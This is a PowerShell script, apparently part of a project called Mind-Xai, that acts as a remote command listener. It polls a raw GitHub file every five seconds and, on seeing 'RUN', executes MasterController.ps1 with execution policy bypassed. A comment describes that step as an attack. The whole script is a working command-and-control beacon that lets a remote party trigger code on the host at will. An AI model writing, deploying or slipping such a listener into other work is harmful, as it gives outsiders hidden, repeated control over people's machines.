# ---------------------------------------------------------
# MIND-XAI | REMOTE LISTENER (Cloud Link)
# Waiting for Global Command...
# ---------------------------------------------------------

$commandURL = "https://raw.githubusercontent.com/Mind-Xai/mindx-ai/main/command.txt"

Write-Host " LISTENING FOR CLOUD COMMANDS..." -ForegroundColor Cyan
Write-Host "   Target: $commandURL" -ForegroundColor DarkGray

while ($true) {
    try {
        # 1. Cloud se file padho (Bina cache ke)
        $action = Invoke-RestMethod -Uri "$commandURL?t=$(Get-Date -Format ss)" -ErrorAction SilentlyContinue
        
        # 2. Agar "RUN" likha ho, toh Attack karo
        if ($action -match "RUN") {
            Write-Host " COMMAND RECEIVED: EXECUTING PROTOCOL..." -ForegroundColor Green
            # MasterController chalao (Option 1 - Auto Mode)
            & powershell -ExecutionPolicy Bypass -File "MasterController.ps1"
            
            Write-Host " Execution Complete. Waiting for next order..." -ForegroundColor Yellow
            Start-Sleep -Seconds 10
        }
        else {
            Write-Host "." -NoNewline -ForegroundColor DarkGray
        }
    }
    catch {
        Write-Host "!" -NoNewline -ForegroundColor Red
    }
    
    # 3. Har 5 second baad check karo
    Start-Sleep -Seconds 5
}
